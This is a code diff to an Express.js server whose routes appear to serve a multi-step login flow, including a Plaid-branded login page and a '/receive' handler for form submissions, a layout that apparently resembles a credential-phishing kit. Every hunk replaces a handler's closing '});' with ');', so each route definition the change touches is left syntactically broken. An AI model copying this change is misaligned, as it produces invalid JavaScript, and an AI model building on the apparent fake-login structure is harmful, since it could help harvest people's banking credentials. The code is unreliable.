@@ -156,7 +156,7 @@ app.get('/login/verification/2', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
-});
+);
 
 // Route handler for '/login/3'
 app.get('/login/link', async (req, res) => {
@@ -169,7 +169,7 @@ app.get('/login/link', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
-});
+);
 
 // Route handler for '/login/4'
 app.get('/login/verification/3', async (req, res) => {
@@ -182,7 +182,7 @@ app.get('/login/verification/3', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
-});
+);
 
 app.get('/login/plaid', async (req, res) => {
   try {
@@ -194,7 +194,7 @@ app.get('/login/plaid', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
-});
+);
 
 app.get('/link', async (req, res) => {
   try {
@@ -206,7 +206,7 @@ app.get('/link', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
-});
+);
 
 app.get('/limk/complete', async (req, res) => {
   try {
@@ -218,7 +218,7 @@ app.get('/limk/complete', async (req, res) => {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
-});
+);
 
 // Route handler for form submission
 app.post('/receive', async (req, res) => {
